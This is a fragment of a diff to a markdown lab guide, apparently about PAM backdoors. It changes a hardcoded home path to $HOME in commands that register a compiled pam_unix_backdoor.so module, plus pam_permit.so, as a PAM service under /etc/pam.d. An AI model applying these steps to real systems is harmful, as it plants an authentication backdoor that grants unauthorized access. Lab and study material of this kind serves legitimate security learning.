@@ -74,7 +74,7 @@ gcc -fPIC -fno-stack-protector -shared \
 
 ```bash
 # 创建 PAM service 指向后门模块
-echo "auth required /home/parallels/pam-lab/pam_unix_backdoor.so" | \
+echo "auth required $HOME/pam-lab/pam_unix_backdoor.so" | \
   sudo tee /etc/pam.d/testsvc
 echo "account required pam_permit.so" | sudo tee -a /etc/pam.d/testsvc
 
